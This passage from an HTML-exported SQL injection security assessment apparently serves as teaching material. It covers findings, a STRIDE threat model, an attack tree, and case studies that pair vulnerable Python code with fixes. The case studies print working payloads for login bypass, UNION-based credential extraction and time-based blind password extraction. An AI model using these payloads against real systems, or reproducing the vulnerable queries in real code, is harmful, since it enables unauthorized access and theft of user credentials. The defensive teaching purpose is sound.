authentication</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80c6-9ffe-dab2fe1b7b36" class=""><strong>2. Second-Order SQL Injection:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-804b-b1e1-fde446dabced" class="bulleted-list"><li style="list-style-type:disc"><strong>Finding</strong>: Stored input executed later</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-801a-822a-f336c8aee8c3" class="bulleted-list"><li style="list-style-type:disc"><strong>Risk</strong>: High</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-806b-b2cf-e40af452d00a" class="bulleted-list"><li style="list-style-type:disc"><strong>Evidence</strong>: Malicious username stored, exploited during login</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d2-ac36-c22c03af65f9" class=""><strong>3. Blind SQL Injection:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8051-bd5f-f31bcb4a0819" class="bulleted-list"><li style="list-style-type:disc"><strong>Finding</strong>: Time-based or boolean-based injection</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8045-82e4-c6d392deba57" class="bulleted-list"><li style="list-style-type:disc"><strong>Risk</strong>: High</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-802c-b9b0-d73cd00ceff3" class="bulleted-list"><li style="list-style-type:disc"><strong>Evidence</strong>: Delayed responses or different behaviors</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-804d-83ef-ef5e8d23c198" class=""><strong>4. No Input Validation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d8-b9ec-f7d1b3326fec" class="bulleted-list"><li style="list-style-type:disc"><strong>Finding</strong>: No validation on user input</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8082-8b92-f38683292bd0" class="bulleted-list"><li style="list-style-type:disc"><strong>Risk</strong>: High</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80ca-a587-fe870a31c3ca" class="bulleted-list"><li style="list-style-type:disc"><strong>Evidence</strong>: Special characters accepted without sanitization</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-805a-9557-c407b55c27c8" class=""><strong>5. Error Message Disclosure:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8041-b61e-ccdf55c1d412" class="bulleted-list"><li style="list-style-type:disc"><strong>Finding</strong>: Database errors exposed to users</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-800e-9bf7-e93b16ebda7c" class="bulleted-list"><li style="list-style-type:disc"><strong>Risk</strong>: Medium</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8041-8d2f-dd8d96e1b198" class="bulleted-list"><li style="list-style-type:disc"><strong>Evidence</strong>: Full SQL errors visible in responses</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80ec-b1f9-e58b28509586"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-80a1-920b-d233fd66eb8d" class=""><strong>Threat Modeling (STRIDE Framework)</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-805b-9bfa-db74949fa4f9" class=""><strong>Spoofing</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8082-b3c6-d71e2b965820" class=""><strong>Threat:</strong> Attacker impersonates legitimate users via SQL injection.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8079-b40f-ef3a91ac6745" class=""><strong>Attack Vectors:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80cd-9c57-d3dae6b598b4" class="bulleted-list"><li style="list-style-type:disc">Authentication bypass</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f4-8105-cfe5fcaa3091" class="bulleted-list"><li style="list-style-type:disc">Session hijacking via SQL injection</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8040-b72d-e3b4801e994e" class="bulleted-list"><li style="list-style-type:disc">Privilege escalation</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8023-9eff-d5e87ec1c4cc" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c1-a48e-f533a48b1f87" class="bulleted-list"><li style="list-style-type:disc">Parameterized queries</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8055-92ba-f47a8dfe2902" class="bulleted-list"><li style="list-style-type:disc">Input validation</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8063-a905-de8c140962ef" class="bulleted-list"><li style="list-style-type:disc">Proper authentication</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8031-832d-d6620d3809bc" class=""><strong>Risk Rating:</strong> High</p></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8098-a1fa-d06292bba3de" class=""><strong>Tampering</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-806e-ac70-e79eed5d91bd" class=""><strong>Threat:</strong> Attacker modifies data via SQL injection.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80b3-aa6f-f191c7e66708" class=""><strong>Attack Vectors:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80bc-b515-ddc08e9c1f1d" class="bulleted-list"><li style="list-style-type:disc">UPDATE statements</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8058-9621-f30a6be1e96a" class="bulleted-list"><li style="list-style-type:disc">DELETE statements</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-807d-af69-c16b2a392a5a" class="bulleted-list"><li style="list-style-type:disc">Data manipulation</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8040-9e1e-c5da28cefaba" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-801f-9c7e-d36c5cebdbc2" class="bulleted-list"><li style="list-style-type:disc">Parameterized queries</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80b7-a5d9-d9eae6d7a5ad" class="bulleted-list"><li style="list-style-type:disc">Least privilege</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80ad-b31e-e516dc95c5b4" class="bulleted-list"><li style="list-style-type:disc">Audit logging</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80c5-b574-e05641761040" class=""><strong>Risk Rating:</strong> High</p></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8079-9f5c-fef372bdea71" class=""><strong>Repudiation</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80a5-832a-c9eeb1f06e3c" class=""><strong>Threat:</strong> Attacker denies actions (no audit trail).</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8022-b318-deae8525aa5e" class=""><strong>Attack Vectors:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8043-8d4c-e2846ab86d2e" class="bulleted-list"><li style="list-style-type:disc">Delete audit logs</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8079-8410-db92ef7a2787" class="bulleted-list"><li style="list-style-type:disc">Modify timestamps</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80b1-9930-d2e5fb9025b8" class="bulleted-list"><li style="list-style-type:disc">Bypass logging</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80dc-bff0-fd40b6ab852f" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8002-9637-f170771a4451" class="bulleted-list"><li style="list-style-type:disc">Immutable audit logs</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-805a-87f0-c01f0c8c70dc" class="bulleted-list"><li style="list-style-type:disc">Database triggers</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8026-8ef2-cdaace49a914" class="bulleted-list"><li style="list-style-type:disc">External logging</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8036-b814-f7195abc5977" class=""><strong>Risk Rating:</strong> Medium</p></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8034-ae70-c20015a68757" class=""><strong>Information Disclosure</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80cc-ba1e-f3659c5b4d2f" class=""><strong>Threat:</strong> Attacker extracts sensitive data.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-804a-bc62-cdd5086f88fc" class=""><strong>Attack Vectors:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80dd-bea0-fed1795577ad" class="bulleted-list"><li style="list-style-type:disc">SELECT statements</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f8-b9f2-c42eca91d46e" class="bulleted-list"><li style="list-style-type:disc">UNION-based extraction</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f6-96c4-fd63d3672a3b" class="bulleted-list"><li style="list-style-type:disc">Error-based disclosure</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8031-804f-d19fa8b39df7" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8028-88cb-cea2f94a61b5" class="bulleted-list"><li style="list-style-type:disc">Parameterized queries</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d9-86d4-e9ce262cc528" class="bulleted-list"><li style="list-style-type:disc">Error handling</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8082-83be-d5434dfc935f" class="bulleted-list"><li style="list-style-type:disc">Data encryption</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80b9-8515-f28034c25a1d" class=""><strong>Risk Rating:</strong> Critical</p></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8047-bc91-ebdbaac68aa4" class=""><strong>Denial of Service</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80ee-8f36-d17a1a25b74d" class=""><strong>Threat:</strong> Attacker causes service disruption.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8055-94bd-c59422fc44e8" class=""><strong>Attack Vectors:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8032-9c45-c56b80d69551" class="bulleted-list"><li style="list-style-type:disc">Heavy queries</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-805e-88b7-d65bc2858a48" class="bulleted-list"><li style="list-style-type:disc">DROP statements</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8073-abd7-ccb7b26df1f0" class="bulleted-list"><li style="list-style-type:disc">Resource exhaustion</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8009-8ba6-d4a4f8085aef" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-801c-98bb-cf82f98fcae1" class="bulleted-list"><li style="list-style-type:disc">Query timeouts</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8002-9160-e44d3861278a" class="bulleted-list"><li style="list-style-type:disc">Resource limits</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8051-bd77-ca1bfb9318fb" class="bulleted-list"><li style="list-style-type:disc">Input validation</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8088-b0c0-c9f22570f57a" class=""><strong>Risk Rating:</strong> High</p></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8056-992d-c3c0e63954b2" class=""><strong>Elevation of Privilege</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-808b-8a1f-c90d15359269" class=""><strong>Threat:</strong> Attacker gains unauthorized access.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8075-bf72-e54c6715b4d1" class=""><strong>Attack Vectors:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8068-8fcf-f33af5ae22dd" class="bulleted-list"><li style="list-style-type:disc">Authentication bypass</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80fd-9903-ea91e3863c52" class="bulleted-list"><li style="list-style-type:disc">Privilege escalation</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8094-9cdc-f0d8acd8c64d" class="bulleted-list"><li style="list-style-type:disc">Admin access</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-801d-93c3-c315ca13ba69" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c7-99c8-e35a635fd2e9" class="bulleted-list"><li style="list-style-type:disc">Parameterized queries</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8092-b54d-c0626cb4e6bc" class="bulleted-list"><li style="list-style-type:disc">Least privilege</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80eb-a99f-fccfa3ec1433" class="bulleted-list"><li style="list-style-type:disc">Access controls</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8065-a92d-fb3f0c2e024e" class=""><strong>Risk Rating:</strong> Critical</p></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8002-b9fb-f185a00d53b7" class=""><strong>Attack Tree: SQL Injection Data Extraction</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8027-89a9-c207fcfd3b41" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SQL Injection Data Extraction
+├── Authentication Bypass
+│   ├── Login form injection
+│   ├── Session manipulation
+│   └── Privilege escalation
+├── Direct Data Extraction
+│   ├── Union-based
+│   ├── Error-based
+│   └── Stacked queries
+├── Blind Data Extraction
+│   ├── Boolean-based
+│   ├── Time-based
+│   └── Out-of-band
+└── Second-Order
+    ├── Stored injection
+    └── Delayed execution
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8002-a53b-d2aa7c018a10"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8076-82f4-dcdae8326406" class=""><strong>Real-World Case Studies</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80d5-bbd6-c444ba23f2a2" class=""><strong>Case Study 1: Authentication Bypass in E-Commerce Platform</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8012-823b-c54229aa1a17" class=""><strong>Background:</strong> During a penetration test of an e-commerce platform, we discovered a critical SQL injection vulnerability in the login functionality.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8058-a713-f74d40751a1c" class=""><strong>Discovery:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80e9-bfd4-cbd0936b223f" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># Vulnerable code
+username = request.form[&#x27;username&#x27;]
+password = request.form[&#x27;password&#x27;]
+query = f&quot;SELECT * FROM users WHERE username = &#x27;{username}&#x27; AND password = &#x27;{password}&#x27;&quot;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-800c-b048-c74e7ae4eb17" class=""><strong>Exploitation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80f6-8952-d1c7431610ae" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- Username: admin&#x27;--
+-- Password: (anything)
+-- Resulting query:
+SELECT * FROM users WHERE username = &#x27;admin&#x27;--&#x27; AND password = &#x27;&#x27;
+-- Bypasses password check!
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80ed-82f3-c65d8b3a31d8" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8040-94eb-c063dcc84f12" class="bulleted-list"><li style="list-style-type:disc"><strong>Confidentiality</strong>: Critical - Access to all user accounts</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8038-8328-dbc96272bd52" class="bulleted-list"><li style="list-style-type:disc"><strong>Integrity</strong>: Critical - Ability to modify orders, prices</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80fa-909b-d061a6de43a2" class="bulleted-list"><li style="list-style-type:disc"><strong>Availability</strong>: High - Could delete user accounts</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d3-9151-e72f694142e7" class="bulleted-list"><li style="list-style-type:disc"><strong>Business Impact</strong>: Critical - Complete platform compromise</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-803f-af51-d684edb69654" class=""><strong>Root Cause:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f2-a9a1-e2acccc88a02" class="bulleted-list"><li style="list-style-type:disc">Direct string concatenation</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80af-b59b-c52bdd7fd280" class="bulleted-list"><li style="list-style-type:disc">No input validation</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-808f-965e-f9b64b49e12d" class="bulleted-list"><li style="list-style-type:disc">No parameterized queries</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-800f-847e-d101ea10e40a" class=""><strong>Remediation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8071-b4c0-fd3a25bec11f" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># Fixed code
+query = &quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;
+cursor.execute(query, (username, password))
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8076-b8d4-c41447e740d9" class=""><strong>Lessons Learned:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80e4-ae10-f4467cfc70bb" class="bulleted-list"><li style="list-style-type:disc">Always use parameterized queries</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c7-ab8f-e9f5e18bf924" class="bulleted-list"><li style="list-style-type:disc">Never trust user input</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8018-846e-c1d809944e6f" class="bulleted-list"><li style="list-style-type:disc">Implement defense in depth</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80c8-87ad-f57a77699796"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80c5-a4cc-ff657ceec892" class=""><strong>Case Study 2: Union-Based Data Extraction</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8000-aa57-fe3b6a4db008" class=""><strong>Background:</strong> Security assessment revealed SQL injection in search functionality.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80ac-8da3-eb3e9c7a06e4" class=""><strong>Discovery:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80b2-a958-d35950c26a57" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># Vulnerable code
+search_term = request.args.get(&#x27;q&#x27;)
+query = f&quot;SELECT * FROM products WHERE name LIKE &#x27;%{search_term}%&#x27;&quot;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8045-89f6-c5d90b092aea" class=""><strong>Exploitation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-801d-aaa3-ef7889a345b5" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- Payload: &#x27; UNION SELECT username, password, email FROM users--
+-- Resulting query:
+SELECT * FROM products WHERE name LIKE &#x27;%&#x27; UNION SELECT username, password, email FROM users--%&#x27;
+-- Extracts all user credentials!
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80e6-94f7-c3c71f33d8cc" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8088-a7de-f61ad94d3c77" class="bulleted-list"><li style="list-style-type:disc"><strong>Confidentiality</strong>: Critical - All user passwords exposed</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80fb-ba86-dd32f84cfd0e" class="bulleted-list"><li style="list-style-type:disc"><strong>Integrity</strong>: High - Could modify user data</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8003-885d-ed92ef02d3c5" class="bulleted-list"><li style="list-style-type:disc"><strong>Business Impact</strong>: Critical - GDPR violation, data breach</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80eb-8fde-e0e24809d34f" class=""><strong>Root Cause:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-809e-9251-f2f4af45a115" class="bulleted-list"><li style="list-style-type:disc">No input validation</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8053-8f62-c91cfb1acf7c" class="bulleted-list"><li style="list-style-type:disc">No output encoding</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80b8-baeb-c4cc6f4c1236" class="bulleted-list"><li style="list-style-type:disc">No parameterized queries</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8013-9450-e33585a61c46" class=""><strong>Remediation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8047-a173-ceea1e258d6a" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># Fixed code
+query = &quot;SELECT * FROM products WHERE name LIKE ?&quot;
+search_pattern = f&quot;%{search_term}%&quot;
+cursor.execute(query, (search_pattern,))
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80bc-af5f-c61965164f7b"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80fd-81c0-e7989b23a240" class=""><strong>Case Study 3: Time-Based Blind SQL Injection</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80e5-9dec-d0486f4252ab" class=""><strong>Background:</strong> Application showed no errors but was vulnerable to blind SQL injection.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-805f-ad52-cf606eb408e3" class=""><strong>Discovery:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8002-90f9-d7a8636a7e19" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># Vulnerable code
+user_id = request.args.get(&#x27;id&#x27;)
+query = f&quot;SELECT * FROM users WHERE id = {user_id}&quot;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80fb-b5cb-db1bda8cdaaa" class=""><strong>Exploitation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8090-938b-fcc67170f728" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- Test payload: 1 AND IF(1=1, SLEEP(5), 0)--
+-- Response delayed by 5 seconds
+-- Confirms SQL injection vulnerability
+
+-- Extract data character by character
+1 AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))=97, SLEEP(5), 0)--
